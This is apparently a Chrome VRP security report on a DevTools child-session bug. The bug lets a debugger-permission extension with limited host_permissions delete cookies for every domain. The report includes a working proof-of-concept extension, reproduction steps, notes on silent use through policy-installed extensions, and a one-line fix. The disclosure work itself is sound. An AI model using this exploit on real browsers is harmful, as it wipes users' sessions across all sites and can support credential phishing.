# VRP Report: Extension Privilege Escalation via DevTools Auto-Attached Session Cookie Access

## 1. Vulnerability Details

### Type
Logic bug — Inconsistent permission delegation in Chrome DevTools Protocol auto-attached child session allows an extension to escalate beyond its declared `host_permissions` scope.

### Affected Component
`content/browser/devtools/protocol/target_handler.cc:618`

### Code Locations

| File | Line | Role |
|------|------|------|
| `content/browser/devtools/protocol/target_handler.cc` | 618 | **BUG**: `MayAccessAllCookies()` hardcoded to return `true` |
| `content/browser/devtools/protocol/target_handler.cc` | 620-636 | Correct pattern: all other 5 methods delegate to `GetRootClient()` |
| `content/browser/devtools/protocol/network_handler.cc` | 2494-2515 | `ClearCookies` branches on `MayAccessAllCookies()` |
| `chrome/browser/extensions/api/debugger/debugger_api.cc` | 670-672 | Extension correctly returns `false` |
| `content/public/browser/devtools_agent_host_client.cc` | 44-47 | Base class comment: extensions should keep default `false` |

### Root Cause

`TargetHandler::Session` is the `DevToolsAgentHostClient` implementation for CDP auto-attached child sessions. When an extension uses `Target.setAutoAttach({flatten: true})`, child targets (Service Workers, iframes, etc.) are automatically attached, creating a `Session` object as their `DevToolsAgentHostClient`.

This `Session` class overrides 6 permission methods. Five correctly delegate to the root client:

```cpp
// target_handler.cc:620-636 — Correct delegation pattern:
bool MayAttachToURL(const GURL& url, bool is_webui) override {
    return GetRootClient()->MayAttachToURL(url, is_webui);  // ✓
}
bool IsTrusted() override { return GetRootClient()->IsTrusted(); }  // ✓
bool MayReadLocalFiles() override { return GetRootClient()->MayReadLocalFiles(); }  // ✓
bool MayWriteLocalFiles() override { return GetRootClient()->MayWriteLocalFiles(); }  // ✓
bool AllowUnsafeOperations() override { return GetRootClient()->AllowUnsafeOperations(); }  // ✓
```

**But `MayAccessAllCookies()` is hardcoded to return `true`:**

```cpp
// target_handler.cc:618 — BUG:
bool MayAccessAllCookies() override { return true; }  // ✗ Does NOT delegate!
```

**The extension's root client explicitly returns `false`:**

```cpp
// chrome/browser/extensions/api/debugger/debugger_api.cc:670-672
bool ExtensionDevToolsClientHost::MayAccessAllCookies() {
  return false;  // Extensions should not have global cookie access
}
```

### Attack Path

```
Extension calls chrome.debugger.attach(tabId)
  → Extension sends Target.setAutoAttach({autoAttach: true, flatten: true})
  → Child target auto-attaches (SW, iframe, etc.)
  → TargetHandler::Session created as DevToolsAgentHostClient for child
  → Extension sends Network.clearBrowserCookies on child session (with sessionId)
  → NetworkHandler::ClearCookies checks client.MayAccessAllCookies()
  → Session.MayAccessAllCookies() returns true (BUG)
  → Enters atomic delete path: cookie_manager->DeleteCookies(empty filter)
  → ALL cookies for ALL domains deleted
```

**Compare normal behavior (parent session):**
```
Extension sends Network.clearBrowserCookies on parent session (no sessionId)
  → NetworkHandler::ClearCookies checks client.MayAccessAllCookies()
  → ExtensionDevToolsClientHost returns false
  → Enters filtered path: GetAllCookies → check CanAccessCookie for each → MayAttachToURL
  → Only cookies matching host_permissions are deleted
```

---

## 2. Vulnerability Impact

### Prerequisites

| Condition | Details |
|-----------|---------|
| **Extension Permission** | `"debugger"` permission (install-time warning shown) |
| **host_permissions** | Can be any limited scope (e.g., only `*://*.example.com/*`) |
| **User Interaction** | Debugger infobar displayed when attaching |
| **Enterprise Scenario** | Policy-installed extensions: no infobar, fully silent |
| **Target Page** | Must have child targets (Service Worker, iframe, etc.) |

### Effect

| Impact Dimension | Description |
|-----------------|-------------|
| **Privilege Escalation** | Extension breaks out of `host_permissions` scope |
| **Destructive** | Atomically deletes all cookies for all domains (irreversible) |
| **User Impact** | All websites simultaneously log out (banking, email, social media, enterprise) |
| **CSRF Protection Broken** | All sites' CSRF tokens invalidated |
| **Trust Violation** | User-visible permission declaration ≠ actual capability |
| **Session Hijacking Setup** | Cookie deletion + phishing page can recapture credentials |

### Why This Is a Real Privilege Escalation

This is NOT a case of "debugger permission is already powerful enough":
- The debugger permission is **scoped by `host_permissions`** for cookie operations
- The parent session correctly enforces this scope (only deletes example.com cookies)
- The child session bypasses this scope due to a single hardcoded `true`
- This creates a clear gap between **user-consented scope** (example.com) and **actual impact** (all domains)
- The `MayAccessAllCookies()` method exists specifically to enforce this boundary
- 5 out of 6 similar methods are correctly implemented — this is an oversight, not a design choice

### Severity: Medium-High (Privilege Escalation + Destructive + User Consent Violation)

---

## 3. Reproduction Steps

### Environment

- **Chrome Version**: Chrome stable (any recent version)
- **OS**: Windows / macOS / Linux (all platforms)
- **No special flags required**
- **Required**: A website with Service Worker (gmail.com, youtube.com, twitter.com)

### Step 1: Create PoC Extension

Create folder `cookie_escalation_extension/` with 4 files:

#### manifest.json
```json
{
  "manifest_version": 3,
  "name": "Cookie Escalation PoC",
  "version": "1.0",
  "description": "Demonstrates MayAccessAllCookies bypass via auto-attached child session",
  "permissions": ["debugger", "activeTab"],
  "host_permissions": ["*://*.example.com/*"],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_popup": "popup.html",
    "default_title": "Cookie Escalation PoC"
  }
}
```

**Key**: `host_permissions` is limited to `*.example.com` only. By design, this extension should only be able to operate on example.com cookies.

#### background.js (core logic)
```javascript
// Key exploit steps:
// 1. Attach debugger to tab
// 2. Enable Target.setAutoAttach({flatten: true})
// 3. Wait for child target (SW/iframe) to auto-attach
// 4. Get child session's sessionId
// 5. Call Network.clearBrowserCookies on child session
// 6. Result: ALL cookies deleted (not just example.com)

async function exploit(tabId) {
  // Attach
  await chrome.debugger.attach({tabId}, "1.3");
  
  // Enable auto-attach
  await chrome.debugger.sendCommand({tabId},
    "Target.setAutoAttach",
    {autoAttach: true, waitForDebuggerOnStart: false, flatten: true}
  );
  
  // Inject iframe to trigger child target
  await chrome.debugger.sendCommand({tabId},
    "Runtime.evaluate",
    {expression: "document.body.appendChild(document.createElement('iframe'))"}
  );
  
  // Listen for child attachment
  chrome.debugger.onEvent.addListener((source, method, params) => {
    if (method === "Target.attachedToTarget") {
      // THE BUG: child session's MayAccessAllCookies() returns true
      chrome.debugger.sendCommand(
        {tabId, sessionId: params.sessionId},
        "Network.clearBrowserCookies",
        {}
      );
      // ALL cookies for ALL domains are now deleted!
    }
  });
}
```

### Step 2: Install Extension

1. `chrome://extensions/` → Developer mode → Load unpacked
2. Select the `cookie_escalation_extension/` folder

### Step 3: Prepare Verification Environment

1. Log into multiple websites (Gmail, GitHub, YouTube, banking sites, etc.)
2. Open `chrome://settings/cookies/all` to confirm cookies exist for multiple domains
3. Navigate to a website with a Service Worker (youtube.com, gmail.com recommended)

### Step 4: Execute Verification

1. On the target page, click the extension icon
2. Click "Run Exploit"
3. Accept the debugger infobar
4. Observe log output

### Step 5: Verify Results

**Vulnerability confirmed if:**
- `[5] clearBrowserCookies on CHILD session SUCCEEDED!`
- `[6] Cookies remaining: 0` (or near zero)
- Refreshing other tabs → all sites require re-login

**Comparison verification (proving bug is in child session):**
- If no child session is obtained, PoC falls back to parent session demonstration
- Parent session's clearBrowserCookies only clears example.com cookies
- Other sites' cookies remain intact

**Expected vs Actual:**
- **Expected**: Only `example.com` cookies cleared (extension's declared scope)
- **Actual**: ALL cookies for ALL domains cleared (privilege escalation)

---

## 4. Device Fingerprint

| Field | Value |
|-------|-------|
| **Chrome Version** | All versions with Target.setAutoAttach support (Chrome 63+) |
| **Build Type** | Release (production) |
| **Platform** | All (Windows/macOS/Linux/ChromeOS) |
| **Required Flags** | None |
| **Required Permissions** | Extension with `debugger` + limited `host_permissions` |
| **Affected Channels** | Stable, Beta, Dev, Canary |
| **User Interaction** | Debugger infobar (skipped for policy-installed extensions) |
| **Network Requirements** | None (local-only attack) |
| **Renderer Compromise** | Not required |
| **Extension Manifest** | V2 or V3 |

### Attack Surface

| Scenario | Infobar? | User Interaction? |
|----------|----------|-------------------|
| User-installed extension | Yes | Accept once |
| Policy-installed extension (`--force-installed`) | **No** | **None** |
| `--silent-debugging` CLI flag | **No** | **None** |

---

## 5. Suggested Fix

### One-line fix:

```cpp
// content/browser/devtools/protocol/target_handler.cc:618
// Before:
bool MayAccessAllCookies() override { return true; }

// After:
bool MayAccessAllCookies() override { return GetRootClient()->MayAccessAllCookies(); }
```

### Verification

After fix:
- `GetRootClient()` for extension clients → `ExtensionDevToolsClientHost`
- `ExtensionDevToolsClientHost::MayAccessAllCookies()` → `false`
- `NetworkHandler::ClearCookies` → takes filtered path
- Only cookies matching `MayAttachToURL` (host_permissions) are deleted

### Why This Is Clearly a Bug (Not Design Choice)

1. **Pattern inconsistency**: 5 out of 6 methods delegate correctly; this one is the outlier
2. **Documented intent**: Base class comment explicitly states extensions should return `false`
3. **Extension implementation exists**: `ExtensionDevToolsClientHost` returns `false` — the intent is clear
4. **The filtered code path exists**: `NetworkHandler::ClearCookies` already has correct filtering logic; the bug just bypasses it

---

## 6. References

- `content/browser/devtools/protocol/target_handler.cc:618` — Bug (hardcoded `true`)
- `content/browser/devtools/protocol/target_handler.cc:620-636` — Correct pattern (all delegate)
- `content/browser/devtools/protocol/network_handler.cc:2494-2515` — `ClearCookies` fast path
- `chrome/browser/extensions/api/debugger/debugger_api.cc:670-672` — Extension returns `false`
- `content/public/browser/devtools_agent_host_client.cc:44-47` — Documented intent
- `content/browser/devtools/devtools_session.h:221,224` — Network+Target available to extensions
